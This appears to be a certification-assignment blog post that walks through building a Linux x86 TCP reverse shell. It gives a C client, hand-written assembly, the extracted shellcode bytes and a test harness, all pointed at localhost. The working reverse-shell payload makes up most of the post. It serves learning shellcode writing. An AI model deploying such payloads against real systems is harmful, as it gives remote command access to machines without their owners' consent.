---
layout: post
title: Assignment #2: Reverse Shell TCP
categories: [re,exploit]
tags: [slae, osce]
fullview: true
comments: true
---

# Assignment #2: Reverse Shell TCP
> This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:
> http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/
> Student ID: SLAE-1228


Before throwing a bunch of asm onto my screen I decided to remember how exactly a TCP bind shell would work in a higher level of abstraction (i.e. C). So I took some time to read TCP/IP Sockets in C - Practical Guide for Programmers. And so should you.

The image below was taken from [here](https://zake7749.github.io/2015/03/17/SocketProgramming/) and explains quite well the workflow of a TCP client-server communication.

![TCP communication workflow](http://i.imgur.com/cqr4O2P.png)

## socket()
According to the book:

```
Socket is an abstraction through which an application may send and receive data in much the same way as an open file allows an application to read and write data to stable storage.
```

That said, the first thing we need in order to do a bind a shell is opening a socket. According to its prototype:

    int socket(int protocolFamily, int type, int protocol)

The *protocolFamily* parameter should be *AF_INET*, the family protocol for internet communication (PF_INET means the same). The *type* parameter defines the communication semantics, if the communication is reliable or best-effort for instance. SOCK_STREAM corresponds to the first case. Since the only protocol we are interested is TCP, we can pass 0 to the third parameter *protocol*.

## connect()
Now that we have opened a socket, let us write code that acctually uses it to start a connection using *connect()*.

    int connect(int socket, struct sockaddr *foreignAddress, unsigned int addressLength) 

The first parameter is pretty clear, just the descriptor we created above. Now for the second one we should pass a sockaddr or sockaddr_in struct, which simply defines the fields we need for internet communication.

```
struct sockaddr_in { 
    unsigned short  sin_family;     /*  Internet protocol (AF_INET) */ 
    unsigned short  sin_port;       /* Address port (16 bits) */ 
    struct in_addr sin_addr;        /*  Internet address (32 bits) */ 
    char sin_zero[8];               /* Not used */ 
};
```
The *addressLength* is the length of the address structure, so *sizeof(struct sockaddr_in)*

## dup2()
Now we already have an established TCP connection we need to generate a new shell and send it through our socket. We can use *dup2()* in order to accomplish it. According to the [man page](https://linux.die.net/man/2/dup2):

```
dup2() makes newfd be the copy of oldfd, closing newfd first if necessary, but note the following:
    * If oldfd is not a valid file descriptor, then the call fails, and newfd is not closed. 
    * If oldfd is a valid file descriptor, and newfd has the same value as oldfd, then dup2() does nothing, and returns newfd.
```

So we will copy each of the INPUT, OUTPUT and ERROR files descriptors into our socket.

```
dup2(sock, 0);
dup2(sock, 1);
dup2(sock, 2);
```

Finally, we use [execve](https://linux.die.net/man/2/execve):

    execve() executes the program pointed to by filename

Therefore:

    execve("/bin/sh", 0, 0);

## Working TCP client
In order to create the simplest client possible, we cut all the error corrections. This is for **educational purposes only** and should NEVER be used in production.

```
int main(int argc , char *argv[]){
	int sock;
	struct sockaddr_in server;

	sock = socket(AF_INET , SOCK_STREAM , 0);

	server.sin_addr.s_addr = inet_addr("127.0.0.1");
	server.sin_family = AF_INET;
	server.sin_port = htons( 8888 );

	connect(sock , (struct sockaddr *)&server , sizeof(server));

	dup2(sock, 0);
	dup2(sock, 1);
	dup2(sock, 2);

	execve("/bin/sh", 0, 0);
	return 0;
}
```

Compiling it without any optimizations and for x86:

    gcc -O0 -m32 client.c -o client

To test it we open a nc listener on port 8888:

    nc -nlvp 8888

And run:

```
$ ./client 

nc -nlvp 8888
listening on [any] 8888 ...
connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 47896
ls
<directory listing here>
```

## Disassembling the ELF

Now lets check the result:

```
$ objdump -d ./client -M intel
...
00000690 <main>:
 690:	8d 4c 24 04          	lea    ecx,[esp+0x4]
 694:	83 e4 f0             	and    esp,0xfffffff0
 697:	ff 71 fc             	push   DWORD PTR [ecx-0x4]
 69a:	55                   	push   ebp
 69b:	89 e5                	mov    ebp,esp
 69d:	53                   	push   ebx
 69e:	51                   	push   ecx
 69f:	83 ec 20             	sub    esp,0x20
 6a2:	e8 b9 fe ff ff       	call   560 <__x86.get_pc_thunk.bx>
 6a7:	81 c3 59 19 00 00    	add    ebx,0x1959
 6ad:	83 ec 0c             	sub    esp,0xc
 6b0:	8d 83 e0 e7 ff ff    	lea    eax,[ebx-0x1820]
 6b6:	50                   	push   eax
 6b7:	e8 34 fe ff ff       	call   4f0 <inet_addr@plt>
 6bc:	83 c4 10             	add    esp,0x10
 6bf:	89 45 e8             	mov    DWORD PTR [ebp-0x18],eax
 6c2:	66 c7 45 e4 02 00    	mov    WORD PTR [ebp-0x1c],0x2
 6c8:	83 ec 0c             	sub    esp,0xc
 6cb:	68 b8 22 00 00       	push   0x22b8
 6d0:	e8 db fd ff ff       	call   4b0 <htons@plt>
 6d5:	83 c4 10             	add    esp,0x10
 6d8:	66 89 45 e6          	mov    WORD PTR [ebp-0x1a],ax
 6dc:	83 ec 04             	sub    esp,0x4
 6df:	6a 00                	push   0x0
 6e1:	6a 01                	push   0x1
 6e3:	6a 02                	push   0x2
 6e5:	e8 f6 fd ff ff       	call   4e0 <socket@plt>
 6ea:	83 c4 10             	add    esp,0x10
 6ed:	89 45 f4             	mov    DWORD PTR [ebp-0xc],eax
 6f0:	83 ec 04             	sub    esp,0x4
 6f3:	6a 10                	push   0x10
 6f5:	8d 45 e4             	lea    eax,[ebp-0x1c]
 6f8:	50                   	push   eax
 6f9:	ff 75 f4             	push   DWORD PTR [ebp-0xc]
 6fc:	e8 ff fd ff ff       	call   500 <connect@plt>
 701:	83 c4 10             	add    esp,0x10
 704:	83 ec 08             	sub    esp,0x8
 707:	6a 00                	push   0x0
 709:	ff 75 f4             	push   DWORD PTR [ebp-0xc]
 70c:	e8 8f fd ff ff       	call   4a0 <dup2@plt>
 711:	83 c4 10             	add    esp,0x10
 714:	83 ec 08             	sub    esp,0x8
 717:	6a 01                	push   0x1
 719:	ff 75 f4             	push   DWORD PTR [ebp-0xc]
 71c:	e8 7f fd ff ff       	call   4a0 <dup2@plt>
 721:	83 c4 10             	add    esp,0x10
 724:	83 ec 08             	sub    esp,0x8
 727:	6a 02                	push   0x2
 729:	ff 75 f4             	push   DWORD PTR [ebp-0xc]
 72c:	e8 6f fd ff ff       	call   4a0 <dup2@plt>
 731:	83 c4 10             	add    esp,0x10
 734:	83 ec 04             	sub    esp,0x4
 737:	6a 00                	push   0x0
 739:	6a 00                	push   0x0
 73b:	8d 83 ea e7 ff ff    	lea    eax,[ebx-0x1816]
 741:	50                   	push   eax
 742:	e8 89 fd ff ff       	call   4d0 <execve@plt>
 747:	83 c4 10             	add    esp,0x10
 74a:	b8 00 00 00 00       	mov    eax,0x0
 74f:	8d 65 f8             	lea    esp,[ebp-0x8]
 752:	59                   	pop    ecx
 753:	5b                   	pop    ebx
 754:	5d                   	pop    ebp
 755:	8d 61 fc             	lea    esp,[ecx-0x4]
 758:	c3                   	ret    
 759:	66 90                	xchg   ax,ax
 75b:	66 90                	xchg   ax,ax
 75d:	66 90                	xchg   ax,ax
 75f:	90                   	nop
```

We can extract the opcodes using this one-liner:

    objdump -d ./client|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'

Piping this into *wc -c* shows how many bytes this shellcode has:

    3463

## Handcrafted shellcode

My idea here is not to generate a small shellcode, but a comprehensible one.

In order to write the shellcode by hand I made good use of both *strace* and *gdb-peda*. The first one was very useful for detecting silly mistakes related the order the parameters were being pushed and things alike. The second one allowed me to debug closely, checking the stack and registers at the same time.

Before starting to write into a blank (actually it is black but anyway) screen, I had to understand how socket related syscalls are used in x86. I must confess I was expecting a few syscalls like *socket*, *connect* and so on. For my surprise, all of these are included in one unique syscall named [socketcall](http://man7.org/linux/man-pages/man2/socketcall.2.html). 

According to man:

    socketcall() is a common kernel entry point for the socket system calls.

Basically, we need to pass 0x66 into *eax*, which means we are about to use *socketcall*. However, in ebx we must also pass the specific socket function to invoke. These are defined in this table:

```
       call              Man page
       SYS__SOCKET        socket(2)
       SYS_BIND          bind(2)
       SYS_CONNECT       connect(2)
       SYS_LISTEN        listen(2)
       SYS_ACCEPT        accept(2)
       SYS_GETSOCKNAME   getsockname(2)
       SYS_GETPEERNAME   getpeername(2)
       SYS_SOCKETPAIR    socketpair(2)
       SYS_SEND          send(2)
       SYS_RECV          recv(2)
       SYS_SENDTO        sendto(2)
       SYS_RECVFROM      recvfrom(2)
       SYS_SHUTDOWN      shutdown(2)
       SYS_SETSOCKOPT    setsockopt(2)
       SYS_GETSOCKOPT    getsockopt(2)
       SYS_SENDMSG       sendmsg(2)
       SYS_RECVMSG       recvmsg(2)
       SYS_ACCEPT4       accept4(2)
       SYS_RECVMMSG      recvmmsg(2)
       SYS_SENDMMSG      sendmmsg(2)
```
You can check more about this table with *grep SYS_ /usr/include/linux/net.h*.

Finally, in ecx (second parameter) we pass a pointer to the list of arguments. Indeed, these arguments will be pushed onto the stack, so we will pass esp to ecx.

Once I got this, the *socket()* part was quite straightforwad.

```
 ;###socket###
 ;socket(AF_INET , SOCK_STREAM , 0);
 
 xor eax, eax
 mov al, 0x66 ;socketcall
 xor ebx, ebx
 mov bl, 0x01 ;socket function
 
 ;push the list of arguments onto the stack
 push 0x00 ;PROT
 push 0x01 ;SOCK_STREAM
 push 0x02 ;AF_INET
 
 mov ecx, esp ;pass the pointer to the list of arguments to ecx
 
 int 0x80
 mov edi, eax ; save socket fd into edi (eax may change!)
```

However, for the *connect()* part things were a little more complicated. I got somewhat confused about dealing with the struct so I put here a few of my mistakes. In order to set the struct correctly, we must push the value of each field (attention to the order) onto the stack taking care with the size of each of them. For instance, if we did:

```
  push 0x0101017f ;sin_addr=127.1.1.1
  push 0xb822 ;sin_port=8888 
  push 0x02 ;AF_INET
``` 

We would be pushing a single byte with *push 0x02*, instead of a word, as it should be. Therefore our struct would be desaligned and bad things would happen. Also, we should notice we are using *127.1.1.1* instead of *127.0.0.1*, due to badchars.

In case you want to confirm the size of the *sockaddr_in* struct and its fields:

```
#include <stdio.h>
#include<sys/socket.h>    //socket

int main()
{
    struct sockaddr_in server;

    printf("sockaddr_in : %d bytes\n", sizeof( server ) );
    printf("int : %d bytes\n", sizeof( int ) );
    printf("short int: %d bytes\n", sizeof( short ) );
    printf("long int: %d bytes\n", sizeof( long ) );
}
```

Here it is a working version of the *connect()* syscall:

```
 ;###connect ###
 
 ;struct sockaddr_in {
 ;   unsigned short  sin_family;     /*  Internet protocol (AF_INET) */
 ;   unsigned short  sin_port;       /* Address port (16 bits) */
 ;   struct in_addr sin_addr;        /*  Internet address (32 bits) */
 ;   char sin_zero[8];               /* Not used */
 ;};
 ;
 ;struct in_addr {
 ;   unsigned long s_addr;  // load with inet_aton()
 ;};
 push 0x0101017f
 push word 0xb822 ; sin_port=8888 
 push word 0x02
 
 mov esi, esp ;save the pointer to the struct in esi
 
 ; connect syscall
 ;int connect(int socket, struct sockaddr \*foreignAddress, unsigned int addressLength)
 xor eax, eax
 mov eax, 0x66 ; socketcall
 xor ebx, ebx
 mov ebx, 0x03 ; connect
 
 push 0x10 ; addressLength=16bytes. short+short+8+long=2+2+8+4=16
 push esi ; address of the struct 
 push edi ; socket fd
 
 mov ecx, esp ;pass the pointer to the list of arguments to ecx
 int 0x80
```

The rest of the code was simple:

```
 ;###copy file descriptors###
 ;dup2(sock, 0);
 ;dup2(sock, 1);
 ;dup2(sock, 2);
 
 mov eax, 0x3f ;dup2
 mov ecx, edi
 mov ebx, 0x0
 
 int 0x80
 
 mov eax, 0x3f ;dup2
 mov ebx, 0x1
 mov ecx, edi
 
 int 0x80
 
 mov eax, 0x3f ;dup2
 mov ebx, 0x2
 mov ecx, edi
 
 int 0x80
 
 ;###execve###
 xor eax, eax
 mov al, 0x0b ;sys_execve
 xor ebx, ebx
 push ebx ;terminate string with \0
 push 0x68732f2f ;String "hs//"
 push 0x6e69622f;String "nib/"
 mov ebx, esp
 
 xor ecx, ecx
 xor edx, edx
 
 int 0x80
```

## Testing the shellcode

Extracting the opcodes:

```
objdump -d ./rev|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
"\x31\xc0\xb0\x66\x31\xdb\xb3\x01\x6a\x00\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x89\xc7\x68\x7f\x01\x01\x01\x66\x68\x22\xb8\x66\x6a\x02\x89\xe6\x31\xc0\xb8\x66\x00\x00\x00\x31\xdb\xbb\x03\x00\x00\x00\x6a\x10\x56\x57\x89\xe1\xcd\x80\xb8\x3f\x00\x00\x00\x89\xf9\xbb\x00\x00\x00\x00\xcd\x80\xb8\x3f\x00\x00\x00\xbb\x01\x00\x00\x00\x89\xf9\xcd\x80\xb8\x3f\x00\x00\x00\xbb\x02\x00\x00\x00\x89\xf9\xcd\x80\x31\xc0\xb0\x0b\x31\xdb\x53\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\xcd\x80"
```

Using the [test skelleton code](https://marcosvalle.github.io/osce/2018/05/03/testing-shellcode.html):

```
#include<stdio.h>
 
char *shellcode = "\x31\xc0\xb0\x66\x31\xdb\xb3\x01\x6a\x00\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x89\xc7\x68\x7f\x01\x01\x01\x66\x68\x22\xb8\x66\x6a\x02\x89\xe6\x31\xc0\xb8\x66\x00\x00\x00\x31\xdb\xbb\x03\x00\x00\x00\x6a\x10\x56\x57\x89\xe1\xcd\x80\xb8\x3f\x00\x00\x00\x89\xf9\xbb\x00\x00\x00\x00\xcd\x80\xb8\x3f\x00\x00\x00\xbb\x01\x00\x00\x00\x89\xf9\xcd\x80\xb8\x3f\x00\x00\x00\xbb\x02\x00\x00\x00\x89\xf9\xcd\x80\x31\xc0\xb0\x0b\x31\xdb\x53\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\xcd\x80"; 
 
 int main(){
     int (*ret)();
     ret = (int(*)())shellcode;
     ret();
 
     return 0;
 }
```

And now:

```
$ ./test 
$ whoami
SLAE-user
```

You can find the complete code with 123 bytes [here](https://github.com/marcosValle).
